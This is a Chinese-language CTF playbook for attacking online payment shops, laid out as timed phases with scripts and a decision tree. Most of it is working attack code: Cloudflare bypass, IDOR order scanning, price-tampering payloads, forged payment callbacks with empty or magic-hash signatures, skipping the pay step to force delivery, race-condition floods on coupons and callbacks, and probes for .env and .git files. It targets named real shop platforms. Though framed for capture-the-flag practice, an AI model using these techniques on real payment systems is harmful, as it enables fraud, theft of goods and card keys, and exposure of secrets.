# 支付CTF标准攻击流程 (Payment CTF Playbook)

> v2.0 — 基于 14 个实战案例（5个支付CTF）提炼
> 每一步都有对应的 toolkit 脚本自动化

## Phase 0: 开局检查 (5 min)

```bash
# 0.1 工具自检
pip list | grep -E 'ddddocr|requests|playwright|Pillow'

# 0.2 目标指纹
python toolkit/api_auth_scanner.py --url $TARGET --preset payment

# 0.3 查攻击网 → 按支付路径走
cat kb/ctf-website/techniques/attack-network.md | grep -A2 PAY
```

## Phase 1: Cloudflare + 环境 (15 min)

```bash
# 1.1 测试是否被CF保护
curl -sI $TARGET | grep -i 'cf-ray\|cf-mitigated\|server: cloudflare'

# 1.2 如果有CF → Playwright绕过
python toolkit/cloudflare_bypass.py --url $TARGET --save-cookies cf_cookies.json

# 1.3 如果没有CF → 直接抓JS
python toolkit/js_api_extractor.py --url $TARGET -o recon_js.json
```

**关键判断**: 页面标题 ≠ "Just a moment..." / "请稍候" = 绕过成功

## Phase 2: 前端逆向 + API枚举 (20 min)

```bash
# 2.1 全量JS抓取+API提取 (CF版本)
# 在Playwright上下文中运行:
python toolkit/js_api_extractor.py --url $TARGET --playwright -o api_map.json

# 2.2 API认证边界扫描
python toolkit/api_auth_scanner.py --url $TARGET --preset payment -o api_auth.json

# 2.3 平台指纹识别
# 检查 api_map.json 中的路径特征 → 对照 platform-fingerprints.md
```

**关键输出**: 
- 所有 `open` 级别的端点（无需认证的攻击面）
- 平台识别 → 选择正确的 IDOR 框架预设

## Phase 3: 认证分析 (20 min)

```bash
# 3.1 邮箱域名探测
python toolkit/email_domain_tester.py --url $TARGET

# 3.2 如果找到可用域名 → 注册
#    如果全部封锁 → 尝试:
#    a. IDOR跳过认证
#    b. 默认/测试账号
#    c. 弱密码爆破已知用户
```

**3.3 双账号矩阵**（如果能注册）:
| 操作 | A session | B session | 预期 |
|------|----------|----------|------|
| B GET A order | A order_id | B cookie | 403 |
| B pay A order | A order_id | B cookie | 403 |
| Notify A with B amount | A order | any | reject |

## Phase 4: IDOR 首攻 (15 min)

> 最高ROI的攻击面 — 3/5个支付CTF通过IDOR拿flag

```bash
# 4.1 自动扫描（覆盖3种框架）
python toolkit/idor_order_scanner.py --url $TARGET --framework all

# 4.2 如果命中 → 提取flag
# 4.3 如果全blocked → 尝试自定义端点:
python toolkit/idor_order_scanner.py --url $TARGET \
  --endpoint /some/api --method POST --body "page=1&limit=100"
```

**IDOR 成功信号**:
- 响应 > 1KB 且不含 "登录/403/404"
- 响应含 `tradeNo`, `card_info`, `secret`, `card_key`

## Phase 5: 支付流程攻击 (30 min)

### 5.1 金额篡改
```python
# 对 valuation API 测试全套金额payload
ATOMIC_PAYLOADS = [0, 0.0, "0", -1, "1e-9", "NaN", None, [], {}]
for amount in ATOMIC_PAYLOADS:
    r = s.post(f"{TARGET}/user/api/index/valuation",
               data={"item_id": ITEM_ID, "num": 1, "amount": amount})
    print(f"{repr(amount):20s} → {r.json().get('data',{}).get('price')}")
```

### 5.2 支付回调签名绕过
```python
# 空签名
s.post(f"{TARGET}/notify", json={"order_id": ID, "sign": "", "status": "paid"})
# 算法降级
s.post(f"{TARGET}/notify", json={"order_id": ID, "sign_type": "none", "sign": ""})
# Magic hash
s.post(f"{TARGET}/notify", json={"order_id": ID, "sign": "0e462097431907509062922748828256"})
```

### 5.3 余额支付 (pay_id=1)
```python
# 如果acg-faka且能登录:
s.post(f"{TARGET}/user/api/order/trade",
       data={"item_id": ITEM_ID, "num": 1, "pay_id": 1, "captcha": CAPTCHA})
# pay_id=1 直接返回 secret!
```

### 5.4 状态机绕过
```python
# 跳过支付直达发货
s.post(f"{TARGET}/user/api/order/deliver", data={"order_id": ID})
s.get(f"{TARGET}/pay/success?order_id={ID}")
```

## Phase 6: 并发攻击 (15 min)

```python
# 优惠券并发
import concurrent.futures
def redeem(i):
    return s.post(f"{TARGET}/api/coupon/redeem",
                  json={"code": "LIMITED_COUPON", "user_id": f"user_{i}"})
with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
    futs = [ex.submit(redeem, i) for i in range(100)]

# 回调并发（幂等绕过）
def notify():
    return s.post(f"{TARGET}/notify", json={"order_id": ID, "status": "paid", "txn": "SAME"})
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
    futs = [ex.submit(notify) for _ in range(50)]
```

## Phase 7: 信息泄露 (10 min)

```bash
# 常见泄露路径
curl -s $TARGET/runtime.log
curl -s $TARGET/.env
curl -s $TARGET/install/
curl -s $TARGET/phpinfo.php
curl -s $TARGET/.git/HEAD
curl -s $TARGET/robots.txt
curl -s $TARGET/sitemap.xml
```

## 决策树

```
新支付CTF目标
  ├─ CF保护? → YES → cloudflare_bypass.py
  │   └─ NO → js_api_extractor.py
  ├─ 平台识别?
  │   ├─ acg-faka → idor_order_scanner.py --framework acg-faka
  │   ├─ Annie Mall → idor_order_scanner.py --framework annie
  │   ├─ dujiaoka → idor_order_scanner.py --framework dujiaoka
  │   └─ 未知 → 全框架扫描
  ├─ IDOR命中? → YES → 🏴 FLAG
  │   └─ NO → 需要注册?
  │       ├─ 邮箱白名单命中? → 注册 → 登录 → 下单
  │       │   ├─ 余额支付直接拿secret
  │       │   └─ 外部支付 → 回调签名绕过
  │       └─ 邮箱全封 → 换攻击面:
  │           ├─ 信息泄露路径
  │           ├─ admin弱密码
  │           └─ SQL注入/CVE
  └─ Flag获取方式:
      ├─ IDOR直接暴露
      ├─ 余额支付secret返回
      ├─ 回调伪造后订单变paid
      └─ admin后台查看
```

## Evidence 交付标准

每个漏洞确认必须包含:
1. `request`: 完整 HTTP method/url/headers/body
2. `response`: status code + body preview
3. `state_diff`: 攻击前后的权益/订单/余额变化
4. `flag`: 自动 regex 提取
